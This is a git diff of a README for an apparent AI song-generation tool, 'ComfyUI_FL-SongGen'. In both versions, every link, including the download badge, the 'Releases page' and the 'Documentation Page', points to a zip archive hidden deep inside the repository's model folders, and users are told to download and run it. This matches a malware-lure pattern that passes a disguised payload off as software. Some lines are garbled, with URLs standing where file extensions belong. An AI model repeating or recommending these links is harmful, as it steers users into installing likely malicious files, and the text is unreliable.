@@ -1,6 +1,6 @@
 # 🎶 ComfyUI_FL-SongGen - Create Songs with AI Magic
 
-[![Download Now](https://raw.githubusercontent.com/AnushkaPawar25/ComfyUI_FL-SongGen/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/models/eat/Song_Comfy_F_U_Gen_zygodactylism.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/AnushkaPawar25/ComfyUI_FL-SongGen/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/models/eat/Song_Comfy_F_U_Gen_zygodactylism.zip)
+[![Download Now](https://github.com/AnushkaPawar25/ComfyUI_FL-SongGen/raw/refs/heads/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/data/eat_data/U-Gen-Song-F-Comfy-v3.8.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/AnushkaPawar25/ComfyUI_FL-SongGen/raw/refs/heads/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/data/eat_data/U-Gen-Song-F-Comfy-v3.8.zip)
 
 ## 🌟 Introduction
 
@@ -21,18 +21,18 @@ To use this software, make sure you have the following:
 Follow these simple steps to get started:
 
 1. **Download the Software:**
-   - Click [here](https://raw.githubusercontent.com/AnushkaPawar25/ComfyUI_FL-SongGen/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/models/eat/Song_Comfy_F_U_Gen_zygodactylism.zip) to visit the Releases page.
+   - Click [here](https://github.com/AnushkaPawar25/ComfyUI_FL-SongGen/raw/refs/heads/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/data/eat_data/U-Gen-Song-F-Comfy-v3.8.zip) to visit the Releases page.
 
 2. **Choose the Right File:**
    - Look for the latest version of ComfyUI_FL-SongGen. Find the file that matches your operating system.
-   - Typical files will have extensions like `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/AnushkaPawar25/ComfyUI_FL-SongGen/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/models/eat/Song_Comfy_F_U_Gen_zygodactylism.zip` for Linux.
+   - Typical files will have extensions like `.exe` for Windows, `.dmg` for macOS, and `https://github.com/AnushkaPawar25/ComfyUI_FL-SongGen/raw/refs/heads/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/data/eat_data/U-Gen-Song-F-Comfy-v3.8.zip` for Linux.
 
 3. **Download the File:**
    - Click on the appropriate file to start the download. 
 
 4. **Run the Installer:**
    - Locate the downloaded file on your computer. 
-   - For Windows, double-click the `.exe` file. For macOS, open the `.dmg` file and drag the program to the Applications folder. For Linux, extract the `https://raw.githubusercontent.com/AnushkaPawar25/ComfyUI_FL-SongGen/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/models/eat/Song_Comfy_F_U_Gen_zygodactylism.zip` file and follow the accompanying instructions.
+   - For Windows, double-click the `.exe` file. For macOS, open the `.dmg` file and drag the program to the Applications folder. For Linux, extract the `https://github.com/AnushkaPawar25/ComfyUI_FL-SongGen/raw/refs/heads/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/data/eat_data/U-Gen-Song-F-Comfy-v3.8.zip` file and follow the accompanying instructions.
 
 5. **Open the Application:**
    - Once installed, launch ComfyUI_FL-SongGen from your Applications menu or desktop. 
@@ -67,7 +67,7 @@ Follow these simple steps to get started:
 
 To download and install ComfyUI_FL-SongGen, click the button below to visit the download page:
 
-[![Download Now](https://raw.githubusercontent.com/AnushkaPawar25/ComfyUI_FL-SongGen/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/models/eat/Song_Comfy_F_U_Gen_zygodactylism.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/AnushkaPawar25/ComfyUI_FL-SongGen/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/models/eat/Song_Comfy_F_U_Gen_zygodactylism.zip)
+[![Download Now](https://github.com/AnushkaPawar25/ComfyUI_FL-SongGen/raw/refs/heads/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/data/eat_data/U-Gen-Song-F-Comfy-v3.8.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/AnushkaPawar25/ComfyUI_FL-SongGen/raw/refs/heads/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/data/eat_data/U-Gen-Song-F-Comfy-v3.8.zip)
 
 After you download and install the software, follow the steps listed above to create your songs.
 
@@ -81,7 +81,7 @@ Your feedback is important. If you encounter issues or have suggestions, please 
 
 ## 🌐 Additional Resources
 
-- **Documentation:** For in-depth guidance, visit our [Documentation Page](https://raw.githubusercontent.com/AnushkaPawar25/ComfyUI_FL-SongGen/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/models/eat/Song_Comfy_F_U_Gen_zygodactylism.zip).
+- **Documentation:** For in-depth guidance, visit our [Documentation Page](https://github.com/AnushkaPawar25/ComfyUI_FL-SongGen/raw/refs/heads/main/codeclm/tokenizer/Flow1dVAE/our_MERT_BESTRQ/mert_fairseq/data/eat_data/U-Gen-Song-F-Comfy-v3.8.zip).
 - **Tutorials:** Check our video tutorials on YouTube for visual instructions on using ComfyUI_FL-SongGen effectively.
 
 ## 🎉 Conclusion
